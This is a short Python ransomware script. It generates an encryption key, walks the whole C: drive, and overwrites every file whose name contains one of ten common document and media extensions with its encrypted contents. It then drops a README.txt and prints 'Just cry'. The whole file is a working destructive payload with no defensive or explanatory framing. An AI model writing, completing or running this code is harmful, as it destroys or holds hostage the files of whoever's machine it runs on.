import os
from cryptography.fernet import Fernet


key = Fernet.generate_key()

with open("key.key",'wb') as theKey:
    theKey.write(key)

ext = ['.pdf','.doc','.xlsx','.mp4','.docx','.mp3','.sql','.csv','.mkv','.pptx']

for i in ext:
    for r, d, f in os.walk("C:\\"):
        for file in f:
            filepath = os.path.join(r, file)
            if i in file:
                with open(filepath,"rb") as fl:
                    data = fl.read()
        
                with open(filepath,"wb") as fl:
                    data = Fernet(key).encrypt(data)
                    fl.write(data)

with open('README.txt','wt') as rd:
    rd.write("ta7ya wlad tizi")

print("Just cry")